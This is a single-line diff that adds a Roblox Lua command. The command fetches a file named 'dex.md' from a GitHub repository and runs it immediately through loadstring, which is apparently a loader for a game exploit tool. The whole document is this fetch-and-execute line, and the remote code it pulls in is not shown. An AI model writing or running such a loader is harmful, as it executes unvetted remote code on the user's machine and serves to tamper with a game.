@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/thangahrt-collab/area-51-alpha-Halloween-/refs/heads/main/dex.md'))()
